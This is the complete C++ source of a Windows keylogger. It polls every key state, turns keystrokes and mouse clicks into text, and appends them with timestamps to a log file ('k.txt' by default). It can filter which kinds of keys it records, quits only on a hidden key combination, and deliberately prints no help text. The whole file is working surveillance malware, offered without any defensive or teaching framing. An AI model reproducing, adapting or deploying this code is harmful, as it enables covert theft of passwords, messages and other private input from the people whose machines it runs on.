#include <windows.h>
#include <string>
#include <fstream>
#include <iostream>
#include <cstdio>
using namespace std;

const char *const Version = "alpha 0.1.2.6";

enum{
	CS_ALL = 0,
	CS_VISIBLE = 1,
	CS_SHIFT = 2,
	CS_CONTROL = 4,
	CS_MOUSE = 8,
	CS_MEDIA = 16,
	CS_BROWSER = 32, // Unsupported at present
	CS_UNKNOWN = 128
};
typedef unsigned short Charset;

typedef struct _Monitor_Info{
	string OutputFile;
	Charset charset;
} Monitor_Info;

typedef struct _Cmdline_Result{
	Monitor_Info monitorInfo; 
} Cmdline_Result;

string GetKey(int Key){
	static string KeyString = "";
	bool IS = (GetKeyState(0x10) & 0x80000000) == 0x80000000;
	if(Key >= 186 && Key <= 222){
		if(IS) switch(Key){
			case 186: KeyString = ":"; break;
			case 187: KeyString = "+"; break;
			case 188: KeyString = "<"; break;
			case 189: KeyString = "_"; break;
			case 190: KeyString = ">"; break;
			case 191: KeyString = "?"; break;
			case 192: KeyString = "~"; break;
			case 219: KeyString = "{"; break;
			case 220: KeyString = "|"; break;
			case 221: KeyString = "}"; break;
			case 222: KeyString = "\""; break;
		}else switch(Key){
			case 186: KeyString = ";"; break;
			case 187: KeyString = "="; break;
			case 188: KeyString = ","; break;
			case 189: KeyString = "-"; break;
			case 190: KeyString = "."; break;
			case 191: KeyString = "/"; break;
			case 192: KeyString = "`"; break;
			case 219: KeyString = "["; break;
			case 220: KeyString = "\\"; break;
			case 221: KeyString = "]"; break;
			case 222: KeyString = "'"; break;
		}
	}
	else if (Key >=48 && Key <= 57){
		if(IS) switch(Key){
			case 49: KeyString = "!"; break;
			case 50: KeyString = "@"; break;
			case 51: KeyString = "#"; break;
			case 52: KeyString = "$"; break;
			case 53: KeyString = "%"; break;
			case 54: KeyString = "^"; break;
			case 55: KeyString = "&"; break;
			case 56: KeyString = "*"; break;
			case 57: KeyString = "("; break;
			case 48: KeyString = ")"; break;
		}
		else KeyString = char(Key);
	}else if (Key >= 65 && Key <= 90){
		if (GetKeyState(VK_CAPITAL) && IS) KeyString = Key + 32;
		else if (!GetKeyState(VK_CAPITAL) && !IS) KeyString = Key + 32;
		else KeyString = Key;
	}else switch(Key){
		case VK_LBUTTON: KeyString = "[LMB]"; break;
		case VK_RBUTTON: KeyString = "[RMB]"; break;
		case VK_MBUTTON: KeyString = "[MMB]"; break;
		case VK_BACK: KeyString = "[BK]"; break;
		case VK_TAB: KeyString = "[Tab]"; break;
		case VK_RETURN: KeyString = "[RET]\n"; break;
		case VK_SHIFT: KeyString = "[Shift]"; break;
		case VK_CONTROL: KeyString = "[Ctrl]"; break;
		case VK_MENU: KeyString = "[Alt]"; break;
		case VK_PAUSE: KeyString = "[Pause]"; break;
		case VK_CAPITAL: KeyString = "[CapsLk]"; break;
		case VK_ESCAPE: KeyString = "[ESC]"; break;
		case VK_SPACE: KeyString = " "; break;
		case VK_PRIOR: KeyString = "[PgUp]"; break;
		case VK_NEXT: KeyString = "[PgDn]"; break;
		case VK_END: KeyString = "[End]"; break;
		case VK_HOME: KeyString = "[Home]"; break;
		case VK_LEFT: KeyString = "[Left]"; break;
		case VK_UP: KeyString = "[Up]"; break;
		case VK_RIGHT: KeyString = "[Right]"; break;
		case VK_DOWN: KeyString = "[Down]"; break;
		case VK_SNAPSHOT: KeyString = "[PrtScr]"; break;
		case VK_INSERT: KeyString = "[Ins]"; break;
		case VK_DELETE: KeyString = "[Del]"; break;
		case VK_HELP: KeyString = "[Help]"; break;
		case VK_LWIN: KeyString = "[LWin]"; break;
		case VK_RWIN: KeyString = "[RWin]"; break;
		case VK_APPS: KeyString = "[Menu]"; break;
		case VK_SLEEP: KeyString = "[Zzz]"; break;
		case VK_NUMPAD0: KeyString = "0"; break;
		case VK_NUMPAD1: KeyString = "1"; break;
		case VK_NUMPAD2: KeyString = "2"; break;
		case VK_NUMPAD3: KeyString = "3"; break;
		case VK_NUMPAD4: KeyString = "4"; break;
		case VK_NUMPAD5: KeyString = "5"; break;
		case VK_NUMPAD6: KeyString = "6"; break;
		case VK_NUMPAD7: KeyString = "7"; break;
		case VK_NUMPAD8: KeyString = "8"; break;
		case VK_NUMPAD9: KeyString = "9"; break;
		case VK_MULTIPLY: KeyString = "*"; break;
		case VK_ADD: KeyString = "+"; break;
		case VK_SEPARATOR: KeyString = "`"; break;
		case VK_SUBTRACT: KeyString = "-"; break;
		case VK_DECIMAL: KeyString = "."; break;
		case VK_DIVIDE: KeyString = "/"; break;
		case VK_F1: KeyString = "[F1]"; break;
		case VK_F2: KeyString = "[F2]"; break;
		case VK_F3: KeyString = "[F3]"; break;
		case VK_F4: KeyString = "[F4]"; break;
		case VK_F5: KeyString = "[F5]"; break;
		case VK_F6: KeyString = "[F6]"; break;
		case VK_F7: KeyString = "[F7]"; break;
		case VK_F8: KeyString = "[F8]"; break;
		case VK_F9: KeyString = "[F9]"; break;
		case VK_F10: KeyString = "[F10]"; break;
		case VK_F11: KeyString = "[F11]"; break;
		case VK_F12: KeyString = "[F12]"; break;
		case VK_NUMLOCK: KeyString = "[NumLk]"; break;
		case VK_SCROLL: KeyString = "[ScrLk]"; break;
		case VK_LSHIFT: KeyString = "[LShift]"; break;
		case VK_RSHIFT: KeyString = "[RShift]"; break;
		case VK_LCONTROL: KeyString = "[LCtrl]"; break;
		case VK_RCONTROL: KeyString = "[RCtrl]"; break;
		case VK_LMENU: KeyString = "[LAlt]"; break;
		case VK_RMENU: KeyString = "[RAlt]"; break;
		case VK_VOLUME_MUTE: KeyString = "[Mute]"; break;
		case VK_VOLUME_DOWN: KeyString = "[Vol-]"; break;
		case VK_VOLUME_UP: KeyString = "[Vol+]"; break;
		case VK_MEDIA_NEXT_TRACK: KeyString = "[MediaNext]"; break;
		case VK_MEDIA_PREV_TRACK: KeyString = "[MediaPrev]"; break;
		case VK_MEDIA_STOP: KeyString = "[MediaStop]"; break;
		case VK_MEDIA_PLAY_PAUSE: KeyString = "[MediaPlay]"; break;
		// 5 Uncommon Keys
		case VK_CANCEL: KeyString = "[Cancel]"; break;
		case VK_CLEAR: // Num5 with NumLock off
			KeyString = "[Clear]"; break;
		case VK_SELECT: KeyString = "[Select]"; break;
		case VK_PRINT: KeyString = "[Print]"; break;
		case VK_EXECUTE: KeyString = "[Execute]"; break;
		// Unsupported Key
		case 255: KeyString = "[X?]"; break;
		default: // Unknown
			{
				char cBuf[4];
				snprintf(cBuf, sizeof(cBuf), "%d", Key);
				KeyString = string("[") + cBuf + "]";
			}
			break;
	}
	return KeyString;
}

bool FindCharset(int Key, Charset cs){
	if (cs == 0) return true; // Any key belongs to CS_ALL
	if ((Key >= 186 && Key <= 222) || (Key >=48 && Key <= 57) || 
		(Key >= 65 && Key <= 90) || (Key >= 96 && Key <= 111)){
			return cs & CS_VISIBLE;
	}else switch(Key){
		case VK_BACK: case VK_RETURN: case VK_SPACE:
			return cs & (CS_VISIBLE | CS_CONTROL);
		case VK_LBUTTON: case VK_RBUTTON: case VK_MBUTTON:
			return cs & CS_MOUSE;
		case VK_SHIFT: case VK_CONTROL: case VK_MENU:
			return (cs & CS_SHIFT) && !(cs & CS_CONTROL);
		case VK_CAPITAL: case VK_PRIOR: case VK_NEXT:
		case VK_NUMLOCK: case VK_END: case VK_HOME:
		case VK_TAB: case VK_INSERT: case VK_DELETE:
		case VK_LEFT:  case VK_UP: case VK_RIGHT: case VK_DOWN:
			return cs & CS_SHIFT;
		case VK_PAUSE: case VK_ESCAPE: case VK_SNAPSHOT: case VK_SCROLL:
		case VK_HELP: case VK_LWIN: case VK_RWIN: case VK_APPS: case VK_SLEEP:
		case VK_F1: case VK_F2: case VK_F3: case VK_F4:
		case VK_F5: case VK_F6: case VK_F7: case VK_F8:
		case VK_F9: case VK_F10: case VK_F11: case VK_F12:
		case VK_LSHIFT: case VK_RSHIFT:
		case VK_LCONTROL: case VK_RCONTROL:
		case VK_LMENU: case VK_RMENU:
		case VK_CLEAR:
			return cs & CS_CONTROL;
		
		case VK_VOLUME_MUTE: case VK_VOLUME_DOWN: case VK_VOLUME_UP:
		case VK_MEDIA_NEXT_TRACK: case VK_MEDIA_PREV_TRACK:
		case VK_MEDIA_STOP: case VK_MEDIA_PLAY_PAUSE:
			return cs & CS_MEDIA;
		// 5 Uncommon Keys
		case VK_CANCEL: case VK_SELECT: case VK_PRINT: case VK_EXECUTE:
		default: return cs & CS_UNKNOWN; 
	}
	return false;
}

string FormatTime(const SYSTEMTIME& Time){
	static string ret;
    static char cBuf[64];
    snprintf(cBuf, sizeof(cBuf), "%d-%2d-%2d %2d:%02d:%02d",
		Time.wYear, Time.wMonth, Time.wDay, Time.wHour, Time.wMinute, Time.wSecond);
    ret = cBuf;
    return ret;
}

int operator >> (const SYSTEMTIME& A, const SYSTEMTIME& B){
	static int MonthDay[13] = {0, 31, -1, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
	int Q, S;
	S = B.wSecond - A.wSecond;
	S += 60*(B.wMinute - A.wMinute);
	S += 3600*(B.wHour - A.wHour);
	if (A.wYear == B.wYear){
		if ((A.wYear % 4 == 0 && A.wYear % 100) || A.wYear % 400 == 0) MonthDay[2] = 29;
		else MonthDay[2] = 28;
		Q = B.wDay - A.wDay;
		for (int i = A.wMonth; i < B.wMonth; i ++)
			Q += MonthDay[i];
	}else{
		Q = B.wDay - A.wDay;
		for (int i = A.wYear+1; i < B.wYear; i ++)
			Q += ((i % 4 == 0 && i % 100) || i % 400 == 0) ? 366 : 365;
		if ((A.wYear % 4 == 0 && A.wYear % 100) || A.wYear % 400 == 0) MonthDay[2] = 29;
		else MonthDay[2] = 28;
		for (int i = A.wMonth; i <= 12; i ++) Q += MonthDay[i];
		if ((B.wYear % 4 == 0 && B.wYear % 100) || B.wYear % 400 == 0) MonthDay[2] = 29;
		else MonthDay[2] = 28;
		for (int i = 1; i < B.wMonth; i ++) Q += MonthDay[i];
	}
	S += 86400*Q;
	return S;
}

DWORD WINAPI MonitorThread(Monitor_Info* mInfo){
	string Filename = mInfo->OutputFile;
	Charset cs = mInfo->charset;
	
	string str;
	fstream file;
	file.open(Filename.c_str(), ios::out | ios::app);
	if (!file.is_open()){
		file.open("stdout.txt", ios::out | ios::app);
		file << "\nError: Failed to open file \"" << Filename << "\"\n";
		file.close();
		exit(1);
	}
	SYSTEMTIME TimeA, TimeB;
	GetLocalTime(&TimeA);
	file << endl << endl << "Launch: " << FormatTime(TimeA) << endl;
	
	const int HiddenSequence[] = {0xA2, 0xA2, 0xA2, 0xA3, 0xA3, 0xA3, 0x46, 0x51, 0x0D};
	const int HiddenSequenceLength = sizeof(HiddenSequence) / sizeof(int);
	int HiddenIndex = 8;
	for (;;){
		Sleep(5);
		for (int i = 1; i <= 255; i ++){
			// if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) continue;
			if (GetAsyncKeyState(i) & 1){
				if (HiddenIndex >= 0 && i == HiddenSequence[HiddenIndex]){
					HiddenIndex ++;
					if (HiddenIndex == HiddenSequenceLength){
						file << "[Quit]";
						file.close();
						exit(0);
					}
					continue;
				}else if (i == 0x08)HiddenIndex = 0;
				else if (i!=VK_SHIFT && i!=VK_CONTROL && i!=VK_MENU)
					HiddenIndex = -1;
				
				GetLocalTime(&TimeB);
				if (TimeA >> TimeB >= 15)
					file << endl << endl << "Idle: " << FormatTime(TimeB) << endl;
				TimeA = TimeB;
				
				if (FindCharset(i, mInfo->charset)){ 
					str = GetKey(i);
					file.write(str.c_str(), str.size());
					file.flush();
				}
			}
		}
	}
	return 0;
}

void ProcessCommandLine(int argc, char* argv[], Cmdline_Result* ret){
	if (argc == 1){
		ret -> monitorInfo.OutputFile = "k.txt";
		ret -> monitorInfo.charset = CS_VISIBLE;
		return;
	}
	string str;
	for (int i = 1; i < argc; i ++){
		if (argv[i][0] == '/' || argv[i][0] == '-'){
			str = argv[i]+1;
			if (str=="o" || str=="Out"){
				ret -> monitorInfo.OutputFile = argv[++i];
				continue;
			}
			if (str=="cs" || str=="Charset"){
				str = argv[++i];
				Charset cs = CS_ALL;
				for (int j = 0; j < str.length(); j ++){
					if (str[j]=='A'){
						cs = CS_ALL;
						break;
					}else switch(str[j]){
						case 'v': cs |= CS_VISIBLE; break;
						case 's': cs |= CS_SHIFT; break;
						case 'c': cs |= CS_CONTROL; break;
						case 'M': cs |= CS_MOUSE; break;
						case 'm': cs |= CS_MEDIA; break;
						case 'B': cs |= CS_BROWSER; break;
						case 'U': cs |= CS_UNKNOWN; break;
						default: break;
					}
				}
				ret -> monitorInfo.charset = cs;
				continue;
			}
			if (str=="h" || str=="help" || str=="-help"){
				// No help here
				exit(0);
			}
		}else{
			cerr << "Unknown argument: " << argv[i] << endl;
			exit(1); 
		}
	}
}

int main(int argc, char* argv[]){
	// Process Command Line Arguments
	Cmdline_Result arg;
	ProcessCommandLine(argc, argv, &arg);
	
	HANDLE hThreadMonitor = CreateThread(
		NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, &arg.monitorInfo, 0, NULL);
	
	WaitForSingleObject(hThreadMonitor, (unsigned long)-1);
	return 0;
}

